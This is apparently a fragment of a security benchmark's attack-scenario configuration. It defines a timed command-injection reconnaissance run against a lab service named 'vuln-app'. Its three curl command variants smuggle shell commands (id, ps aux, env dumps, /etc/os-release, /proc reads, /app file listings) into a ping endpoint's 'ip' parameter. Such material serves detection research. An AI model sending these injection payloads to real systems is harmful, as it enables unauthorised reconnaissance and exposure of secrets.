      "benchmark_split": "attack_dev",
      "kind": "attack",
      "target_service": "vuln-app",
      "driver_role": "attacker",
      "positive_roles": ["attacker", "target"],
      "negative_roles": [],
      "duration_seconds": 210,
      "warmup_seconds": 60,
      "attack_seconds": 90,
      "cooldown_seconds": 60,
      "description": "Process, environment, filesystem, and app-configuration reconnaissance through command injection.",
      "command_variants": [
        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;id;uname -a;pwd;ls -la /app;find /app -maxdepth 2 -type f | sort | head -n 25\" >/dev/null",
        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;ps aux;env | sort | head -n 25;cat /etc/os-release;ls -la /tmp\" >/dev/null",
        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;whoami;hostname;cat /proc/self/status;ls -la /proc/1;stat /app/app.py\" >/dev/null"
      ],
      "variant_metadata": [
        {"variant_id": "recon_fs_app", "command_template_id": "recon_probe.fs_app_listing", "parameters": {"focus": "app_files", "max_depth": 2, "head_lines": 25}},
        {"variant_id": "recon_proc_env", "command_template_id": "recon_probe.proc_env_listing", "parameters": {"focus": "process_env", "env_head_lines": 25}},
        {"variant_id": "recon_proc_status", "command_template_id": "recon_probe.proc_status_probe", "parameters": {"focus": "proc_status", "proc_path": "/proc/1"}}
      ]
